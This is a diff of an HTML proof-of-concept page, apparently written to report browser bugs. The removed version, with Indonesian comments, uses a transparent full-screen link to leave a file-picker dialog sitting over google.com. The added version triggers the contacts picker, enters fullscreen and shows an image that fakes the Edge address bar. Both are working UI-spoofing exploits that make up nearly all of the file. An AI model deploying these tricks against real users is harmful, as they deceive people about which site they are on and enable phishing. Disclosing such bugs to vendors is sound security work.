@@ -1,58 +1,38 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { margin: 0; padding: 0; font-family: sans-serif; }
-        h1 { text-align: center; margin-top: 50px; }
-        
-        /* Membuat link menutupi seluruh layar */
-        #link {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10;
-            text-decoration: none;
-            /* Debug: ganti background ke rgba(0,0,0,0.1) untuk lihat area klik */
-            background: transparent; 
-        }
-
-        #fileSelect { display: none; }
-        #preview { width: 100%; margin-top: 20px; }
-    </style>
-</head>
-<body>
-
-    <h1>Ketuk di mana saja untuk lanjut ke Google</h1>
-
-    <input id="fileSelect" type="file" accept="image/*">
-
-    <a id="link" href="https://www.google.com" target="_blank"></a>
-
-    <img id="preview">
-
-    <script>
-        const link = document.getElementById('link');
-        const fileSelect = document.getElementById('fileSelect');
-
-        link.onclick = (e) => {
-            // 1. Picu dialog file secara sinkron segera setelah klik
-            fileSelect.click();
-
-            // 2. Biarkan aksi default <a> (membuka google.com) berjalan.
-            // Di Android, ini seringkali membuat dialog sistem "tertinggal" 
-            // di depan layar meskipun tab di bawahnya berganti ke Google.
-        };
-
-        // Menampilkan hasil jika file dipilih (opsional)
-        fileSelect.onchange = () => {
-            if (fileSelect.files.length > 0) {
-                document.getElementById('preview').src = URL.createObjectURL(fileSelect.files);
-                alert("File berhasil dipilih dalam konteks PoC.");
+<html lang="en">
+    <head>
+        <title>Security UI Spoof Edge</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
             }
-        };
-    </script>
-</body>
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="edgespoof.jpg"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the edge omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
